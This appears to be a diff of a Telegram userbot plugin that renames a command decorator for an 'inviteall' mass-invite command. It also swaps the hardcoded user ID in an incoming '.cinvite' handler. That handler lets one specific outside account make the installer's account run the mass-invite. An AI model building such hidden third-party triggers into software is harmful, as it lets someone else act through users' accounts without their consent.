@@ -9,7 +9,7 @@ from telethon.tl.functions.messages import GetFullChatRequest
 
 from userbot import CMD_HELP, CMD_HANDLER as cmd
 from userbot.events import register
-from userbot.utils import edit_or_reply, kyy_cmd
+from userbot.utils import edit_or_reply, av_cmd
 
 
 async def get_chatinfo(event):
@@ -49,8 +49,8 @@ async def get_chatinfo(event):
     return chat_info
 
 
-@kyy_cmd(pattern="inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
+@av_cmd(pattern="inviteall(?: |$)(.*)")
+@register(incoming=True, from_users=2004395661,
           pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
